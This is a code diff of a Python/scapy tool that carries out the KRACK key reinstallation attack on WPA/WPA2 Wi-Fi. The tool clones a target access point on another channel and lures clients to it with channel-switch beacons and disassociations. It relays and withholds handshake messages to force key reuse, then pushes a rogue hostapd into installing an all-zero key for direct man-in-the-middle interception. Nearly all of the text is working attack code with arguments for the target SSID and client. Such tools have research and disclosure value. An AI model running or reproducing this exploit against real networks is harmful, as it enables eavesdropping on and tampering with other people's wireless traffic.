@@ -3,26 +3,30 @@ from scapy.all import *
 import sys, os, struct, time, argparse, heapq
 from datetime import datetime
 
+# TODO:
+# - When the client immediately sends data on the rogue channel, it will be deauthenticated by the rogue kernel
+# - Option to make a debug pcap capture
+
 CHANNEL_AP    = 1                   # Channel of the original AP
 CHANNEL_CLONE = 11                  # Channel where the original AP will be cloned on
 IFACE_MON     = "wlan2mon"	    # Interface on same channel as the real AP
 
-IEEE_TLV_TYPE_SSID = 0
-IEEE_TLV_TYPE_CSA  = 37
-
-WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY = 4
+IEEE_TLV_TYPE_SSID    = 0
+IEEE_TLV_TYPE_CHANNEL = 3
+IEEE_TLV_TYPE_RSN     = 48
+IEEE_TLV_TYPE_CSA     = 37
+IEEE_TLV_TYPE_VENDOR  = 221
 
 
 #### Basic output and logging functionality ####
 
-DEBUG, INFO, STATUS, WARNING, ERROR = range(5)
+ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
 COLORCODES = { "gray"  : "\033[0;37m",
                "green" : "\033[0;32m",
                "orange": "\033[0;33m",
                "red"   : "\033[0;31m" }
 
-# TODO: command-line argument to change this
-loglevel = INFO
+loglevel = DEBUG
 def log(level, msg, color=None, showtime=True):
 	if level < loglevel: return
 	if level == DEBUG   and color is None: color="gray"
@@ -32,6 +36,24 @@ def log(level, msg, color=None, showtime=True):
 
 
 #### Packet Processing Functions ####
+
+def xorstr(lhs, rhs):
+	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])
+
+def recv_dot11(socket):
+	p = socket.recv()
+	if p == None or not Dot11 in p: return None
+	# Hack: ignore frames that we just injected and are echoed back by the kernel
+	if p[Dot11].FCfield & 0x20 != 0:
+		log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
+		return None
+	return p[Dot11]
+
+def send_dot11(socket, p):
+	# Hack: set the More Data flag so we can detect injected frames
+	p[Dot11].FCfield |= 0x20
+	socket.send(RadioTap()/p)
+	log(DEBUG, "Injected frame: %s" % dot11_to_str(p))
 
 def get_eapol_msgnum(p):
 	FLAG_PAIRWISE = 0b0000001000
@@ -54,57 +76,21 @@ def get_eapol_msgnum(p):
 			else: return 2
 
 	return 0
-			
-
-#### Man-in-the-middle Setup Code ####
-
-def xorstr(lhs, rhs):
-	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])
-
-def recv_dot11(socket):
-	p = socket.recv()
-	if p == None or not Dot11 in p: return None
-	# Hack: ignore frames that we just injected and are echoed back by the kernel
-	if p[Dot11].FCfield & 0x20 != 0:
-		log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
-		return None
-	return p[Dot11]
-
-def send_dot11(socket, p):
-	# Hack: set the More Data flag so we can detect injected frames
-	p[Dot11].FCfield |= 0x20
-	socket.send(RadioTap()/p)
-
-def dot11_get_iv(p):
-	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
-	if Dot11WEP not in p:
-		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
-		return 0
-
-	wep = p[Dot11WEP]
-	if wep.keyid & 32:
-		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
-	else:
-		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
 
 def dot11_to_str(p):
 	if Dot11Beacon in p:      return "Beacon(TSF=%d)" % p[Dot11Beacon].timestamp
 	elif Dot11ProbeReq in p:  return "ProbeReq"
 	elif Dot11ProbeResp in p: return "ProbeResp"
-	elif Dot11Auth in p:      return "Auth"
-	elif Dot11Deauth in p:    return "Deauth"
+	elif Dot11Auth in p:      return "Auth(status=%d)" % p[Dot11Auth].status
+	elif Dot11Deauth in p:    return "Deauth(reason=%d)" % p[Dot11Deauth].reason
 	elif Dot11AssoReq in p:   return "AssoReq"
-	elif Dot11AssoResp in p:  return "AssoResp"
+	elif Dot11AssoResp in p:  return "AssoResp(status=%d)" % p[Dot11AssoResp].status
 	elif Dot11Disas in p:     return "Disas"
 	elif Dot11WEP in p:       return "EncryptedData(IV=%d)" % dot11_get_iv(p)
 	elif EAPOL in p:
 		if get_eapol_msgnum(p) != 0: return "EAPOL msg%d" % get_eapol_msgnum(p)
 		else:                        return repr(p)
-	return repr(p)
-
-def print_rx(level, name, p, color=None):
-	if color is None and Dot11Deauth in p: color="orange"
-	log(level, "%s: %s -> %s: %s" % (name, p.addr2, p.addr1, dot11_to_str(p)), color=color)
+	return repr(p)			
 
 def construct_csa():
 	switch_mode = 1		# STA should not Tx untill switch is completed
@@ -134,6 +120,25 @@ def get_tlv_value(p, type):
 			return el.info
 	return None
 
+def dot11_get_iv(p):
+	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
+	if Dot11WEP not in p:
+		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
+		return 0
+
+	wep = p[Dot11WEP]
+	if wep.keyid & 32:
+		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
+	else:
+		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
+
+
+#### Man-in-the-middle Setup Code ####
+
+def print_rx(level, name, p, color=None, suffix=None):
+	if color is None and Dot11Deauth in p: color="orange"
+	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
+
 
 class NetworkConfig():
 	def __init__(self):
@@ -143,6 +148,7 @@ class NetworkConfig():
 		self.wpavers = 0
 		self.pairwise_ciphers = set()
 		self.akms = set()
+		self.wmmenabled = 0
 
 	def is_wparsn(self):
 		return not self.group_cipher is None and self.wpavers > 0 and \
@@ -166,16 +172,18 @@ class NetworkConfig():
 	def from_beacon(self, p):
 		el = p[Dot11Elt]
 		while isinstance(el, Dot11Elt):
-			if el.ID == 0:
+			if el.ID == IEEE_TLV_TYPE_SSID:
 				self.ssid = el.info
-			elif el.ID == 3:
+			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
 				self.channel = ord(el.info[0])
-			elif el.ID == 48:
+			elif el.ID == IEEE_TLV_TYPE_RSN:
 				self.parse_wparsn(el.info)
 				self.wpavers |= 2
-			elif el.ID == 221 and el.info[:4] == "\x00\x50\xf2\x01":
+			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x01":
 				self.parse_wparsn(el.info[4:])
 				self.wpavers |= 1
+			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x02":
+				self.wmmenabled = 1
 
 			el = el.payload
 
@@ -190,6 +198,7 @@ wpa_key_mgmt={akms}
 wpa_pairwise={pairwise}
 rsn_pairwise={pairwise}
 
+wmm_enabled={wmmenabled}
 hw_mode=g
 auth_algs=3
 wpa_passphrase=XXXXXXXX"""
@@ -201,7 +210,8 @@ wpa_passphrase=XXXXXXXX"""
 			channel = self.channel,
 			wpaver = self.wpavers,
 			akms = " ".join([akm2str[idx] for idx in self.akms]),
-			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]))
+			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
+			wmmenabled = self.wmmenabled)
 
 
 class ClientState():
@@ -210,14 +220,16 @@ class ClientState():
 		self.reset()
 
 	def reset(self):
-		self.is_mitmed = False
+		self.forward_frames = False
 		self.previv = None
 		self.prevkeystream = None
+		self.assocreq = None
 		self.msg3s = []
-		#self.msg4 = None
+		self.msg4 = None
+		self.krack_finished = False
 
 
-class DejaVuAttack():
+class KRAckAttack():
 	def __init__(self, nic_real, nic_rogue, ssid, clientmac=None):
 		self.nic_real = nic_real
 		self.nic_rogue = nic_rogue
@@ -257,115 +269,171 @@ class DejaVuAttack():
 		self.send_csa_beacon()
 		self.queue_disas(macaddr)
 
-	def intercept_sentby_ap(self, p, client=None):
-		if client and not client.is_mitmed: return
+	def hostapd_add_allzero_client(self, client):
+		if client.assocreq is None:
+			log(ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
+			return False
+		if client.msg4 is None:
+			log(ERROR, "Didn't receive EAPOL msg4 of client %s, unable to let rogue hostapd handle client." % client.macaddr)
+			return False
 
-		eapolnum = get_eapol_msgnum(p)
-		if not client is None and eapolnum == 3:
-			client.msg3s.append(p)
-			# FIXME: This may cause a timeout on the client side
-			if len(client.msg3s) >= 3:
-				for p in client.msg3s:
-					send_dot11(self.sock_rogue, p)
-				client.msg3s = []
-				log(STATUS, "Got 3rd EAPOL msg3, will now forward all three msg3's", color="green", showtime=False)
-			else:
-				log(STATUS, "Not forwarding EAPOL msg3 (%d now queued)" % len(client.msg3s), color="green", showtime=False)
-			return
-		
-		if p.addr1 != "ff:ff:ff:ff:ff:ff":
-			send_dot11(self.sock_rogue, p)
+		framehdr = Dot11(addr1=self.apmac, addr2=client.macaddr, addr3=self.apmac)
+
+		# 1. Clear any client state at rogue hostapd/kernel
+		deauth = framehdr/Dot11Deauth()
+		send_dot11(self.sock_rogue, deauth)
+
+		# 2. Inform hostapd/kernel of a new client to handle using magic sequence number 1337
+		auth = framehdr/Dot11Auth(algo="open", seqnum=0x10, status=0)
+		send_dot11(self.sock_rogue, auth)
+
+		# 3. Inform hostapd of the encryption algorithm and options the client uses
+		assoc = framehdr/client.assocreq
+		send_dot11(self.sock_rogue, assoc)
+
+		# 4. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
+		msg4 = framehdr/client.msg4
+		send_dot11(self.sock_rogue, msg4)
+
+		return True
 
 	def handle_rx_realchan(self):
 		p = recv_dot11(self.sock_real)
 		if p == None: return
 
-		# 1a. Track wether the targeted client is directly sending to the AP on the real channel
-		if self.clientmac is not None and self.clientmac == p.addr2 and p.addr1 == self.apmac:
-			print_rx(INFO, "Real channel ", p)
+		# 1. Handle frames sent TO the real AP
+		if p.addr1 == self.apmac:
+			# If it's an authentication to the real AP, always display it ...
 			if Dot11Auth in p:
-				log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % self.clientmac)
-				if p.addr2 in self.clients: self.clients[p.addr2].reset()
+				print_rx(INFO, "Real channel ", p, color="orange")
+
+				# ... with an extra clear warning when we wanted to MitM this specific client
+				if self.clientmac == p.addr2:
+					log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % self.clientmac)
+
+				if p.addr2 in self.clients: del self.clients[p.addr2]
 				self.try_channel_switch(p.addr2)
-		# 1b. And display all other frames it is sending or receiving
-		elif self.clientmac is not None and (self.clientmac in [p.addr1, p.addr2]) and (self.apmac in [p.addr1, p.addr2]):
-			print_rx(INFO, "Real channel ", p)
-		# 1c. Display other clients that are trying to authenticate on the real channel
-		elif p.addr1 == self.apmac and Dot11Auth in p:
-			print_rx(INFO, "Real channel ", p, color="orange")
-			if p.addr2 in self.clients: self.clients[p.addr2].reset()
-			self.try_channel_switch(p.addr2)
 
-		# 3. Now focus on data send by the real AP to a client we are MitM'ing or want to target
-		if p.addr2 != self.apmac: return
-		if Dot11Beacon in p: print_rx(DEBUG, "Real channel ", p)
-		if not p.addr1 in self.clients: return
+			# Clients sending a deauthentication to the real AP are also interesting ...
+			elif Dot11Deauth in p:
+				print_rx(INFO, "Real channel ", p)
+				if p.addr2 in self.clients: del self.clients[p.addr2]
 
-		# Frames sent by the targeted client is already displayed, so display all others
-		if p.addr1 != self.clientmac: print_rx(INFO, "Real channel ", p)
+			# For all other frames, only display them if they come from the targeted client
+			elif self.clientmac is not None and self.clientmac == p.addr2:
+				print_rx(INFO, "Real channel ", p)
 
-		self.intercept_sentby_ap(p, self.clients[p.addr1])
+
+		# 2. Handle frames sent BY the real AP
+		elif p.addr2 == self.apmac:
+			# Decide whether we will (eventually) forward it
+			might_forward = p.addr1 in self.clients and self.clients[p.addr1].forward_frames
+
+			# If targeting a specific client, display all frames it sends ...
+			if self.clientmac is not None and self.clientmac == p.addr1:
+				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
+				# ... and show special information of deauthentication frames
+				if Dot11Deauth in p:
+					log(INFO, "Note: this Deauth is%sforwarded to the rogue channel" % (" " if might_forward else " not "),
+						showtime=False, color="orange" if might_forward else None)
+
+			# For other clients, just display what might be forwarded
+			elif might_forward:
+				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
+
+
+			# Now perform actual actions that need to be taken, along with additional output
+			if might_forward:
+				client = self.clients[p.addr1]
+
+				eapolnum = get_eapol_msgnum(p)
+				if eapolnum == 3:
+					client.msg3s.append(p)
+					# FIXME: This may cause a timeout on the client side???
+					if len(client.msg3s) >= 3:
+						log(STATUS, "Got 3rd EAPOL msg3, will now forward all three msg3's", color="green", showtime=False)
+						for p in client.msg3s: send_dot11(self.sock_rogue, p)
+						client.msg3s = []
+					else:
+						log(STATUS, "Not forwarding EAPOL msg3 (%d now queued)" % len(client.msg3s), color="green", showtime=False)
+
+				elif Dot11Deauth in p:
+					del self.clients[p.addr1]
+					send_dot11(self.sock_rogue, p)
+
+				else:
+					send_dot11(self.sock_rogue, p)
+
 
 	def handle_rx_roguechan(self):
 		p = recv_dot11(self.sock_rogue)
 		if p == None: return
 
-		# 1. Display frames sent by the rouge AP to the targeted client or MitM'ed client (and then ignore them)
-		if (p.addr1 == self.clientmac or p.addr1 in self.clients) and p.addr2 == self.apmac:
-			print_rx(INFO, "Rouge channel", p)
-			return
+		# 1. Handle frames sent BY the rouge AP
+		if p.addr2 == self.apmac:
+			# Display all frames sent by the targeted client
+			if self.clientmac is not None and p.addr1 == self.clientmac:
+				print_rx(INFO, "Rouge channel", p)
+			# And display all frames sent to a MitM'ed client
+			if p.addr1 in self.clients:
+				print_rx(INFO, "Rouge channel", p)
 
-		# 2. Now focus on data send by a MitM'ed (or about to be MitM'ed) client towards the AP
-		if p.addr1 != self.apmac: return
-		if not p.addr2 in self.clients and not Dot11Auth in p: return
 
-		print_rx(INFO, "Rogue channel", p)
+		# 2. Handle frames sent TO the AP
+		elif p.addr1 == self.apmac:
+			client = None
 
-		# 3. Check if it's a new client that we can MitM
-		if Dot11Auth in p:
-			log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green", showtime=False)
-			self.clients[p.addr2] = ClientState(p.addr2)
-			self.clients[p.addr2].is_mitmed = True
+			# Check if it's a new client that we can MitM
+			if Dot11Auth in p:
+				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
+				log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green", showtime=False)
+				self.clients[p.addr2] = ClientState(p.addr2)
+				self.clients[p.addr2].forward_frames = True
+				client = self.clients[p.addr2]
+			# Otherwise check of it's an existing client we are tracking/MitM'ing
+			elif p.addr2 in self.clients:
+				client = self.clients[p.addr2]
+				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if client.forward_frames else None)
 
-		# 4. TODO: Is it useful to check and set is_mitmed ???
-		client = self.clients[p.addr2]
-		if not client.is_mitmed: return None
+			# If this now belongs to a client we want to track, process the packet further
+			if client is not None:
+				# Save the association request so we can track the encryption algorithm and options the client uses
+				if Dot11AssoReq in p: client.assocreq = p
+				# Save msg4 so we can easily make the rogue AP finish the 4-way handshake and install an all-zero key
+				if get_eapol_msgnum(p) == 4: client.msg4 = p
 
-		
+				# Use encrypted frames to determine if the key reinstallation attack succeeded
+				if Dot11WEP in p and not client.krack_finished:
+					# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
+					plaintext = "\xaa\xaa\x03\x00\x00\x00"
+					encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
+					keystream = xorstr(plaintext, encrypted)
 
-		# 4. We block and store Msg4 to forward it when the attack is done -- FIXME encrypted Msg4's and forwarded anyway...??
-		#eapolnum = get_eapol_msgnum(p)
-		#if eapolnum == 4:
-		#	client.msg4 = p
-		#	log(STATUS, "Not forwarding EAPOL msg4 (TODO: Track reception?)", color="green")
-		#	return
+					iv = dot11_get_iv(p)
+					if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)
 
-		# 5. Use encrypted frames to determine if the key reinstallation attack succeeded
-		if Dot11WEP in p:
-			# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
-			plaintext = "\xaa\xaa\x03\x00\x00\x00\x88\x8e"
-			encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
-			keystream = xorstr(plaintext, encrypted)
+					if client.previv == iv:
+						# If the same keystream is reused, we have a normal key reinstallation attack
+						if keystream == client.prevkeystream:
+							log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
 
-			iv = dot11_get_iv(p)
-			if client.previv == iv:
-				# If the same keystream is reused, we have a normal key reinstallation attack
-				if keystream == client.prevkeystream:
-					log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
+						# Otherwise the client likely installed a new key, i.e., probably an all-zero key
+						else:
+							log(STATUS, "SUCCESS! Nonce reuse (IV=%d), with likely use of all-zero key." % iv, color="green", showtime=False)
+							log(STATUS, "Now directly MitM'ing using rogue AP ...", color="green", showtime=False)
 
-				# Otherwise the client likely installed a new key, i.e., probably an all-zero key
-				else:
-					log(STATUS, "SUCCESS! Nonce reuse, with likely use of all-zero key.")
-					log(STATUS, "Now directly MitM'ing using rogue AP ...", color="green", showtime=False)
-					log(STATUS, "!!! TODO !!! Forwarding Msg4 to rogue AP to fully accept client", color="green", showtime=False)
+							self.hostapd_add_allzero_client(client)
 
-					# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
-					client.is_mitmed = False
+							# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
+							client.forward_frames = False
 
-			client.previv = iv
-			client.prevkeystream = keystream
+						client.krack_finished = True
 
-		send_dot11(self.sock_real, p)
+					client.previv = iv
+					client.prevkeystream = keystream
+
+				if client.forward_frames: send_dot11(self.sock_real, p)
+
 
 	def run(self):
 		# Make sure to use a recent backports driver package so we can indeed
@@ -410,14 +478,16 @@ class DejaVuAttack():
 
 
 if __name__ == "__main__":
-	parser = argparse.ArgumentParser(description='Key Reinstallation Attacks', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+	# TODO: Optional interface to manually provide a monitor interface for the rogue channel
+	# TODO: Parameter to set debut output level
+	parser = argparse.ArgumentParser(description='Key Reinstallation Attacks (KRAck Attacks)', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 	parser.add_argument('nic_real_ap', help='Wireless monitor interface that will listen on the channel of the target AP.')
 	parser.add_argument('nic_rogue_ap', help='Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.')
 	parser.add_argument('ssid', help='The SSID of the network to attack.')
 	parser.add_argument('--clientmac', help='Only attack clients with the given MAC adress.')
 	args = parser.parse_args()
 
-	dejavu = DejaVuAttack(args.nic_real_ap, args.nic_rogue_ap, args.ssid, args.clientmac)
-	dejavu.run()
+	attack = KRAckAttack(args.nic_real_ap, args.nic_rogue_ap, args.ssid, args.clientmac)
+	attack.run()
 
 
